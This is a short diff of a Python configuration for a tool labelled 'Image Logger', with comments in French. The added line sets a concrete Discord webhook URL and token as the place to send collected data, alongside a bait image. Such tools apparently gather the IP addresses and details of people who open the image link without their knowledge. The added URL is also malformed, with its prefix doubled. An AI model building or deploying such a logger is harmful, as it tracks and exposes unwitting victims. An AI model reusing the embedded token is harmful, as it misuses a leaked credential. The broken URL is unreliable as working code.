@@ -11,7 +11,7 @@ import os
 WEBHOOK_URL = os.getenv("WEBHOOK_URL")  # À définir dans les variables d'environnement de ton hébergeur
 
 config = {
-    "webhook": WEBHOOK_URL or "https://discord.com/api/webhooks/TON_WEBHOOK_ICI",  # Sera remplacé par env
+    "webhook": WEBHOOK_URL or "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1494388722068881551/GPELkrraANFn11tOWYFrlhBmiviZB4mn5xUyXuWTwz4Fwqn9SpMiEZnNyRs2sIY7cutU",  # Sera remplacé par env
     "image": "https://i.pinimg.com/736x/df/96/d8/df96d84e03317bba5b9961e75382ec37.jpg",
     "imageArgument": True,
     "username": "Image Logger",
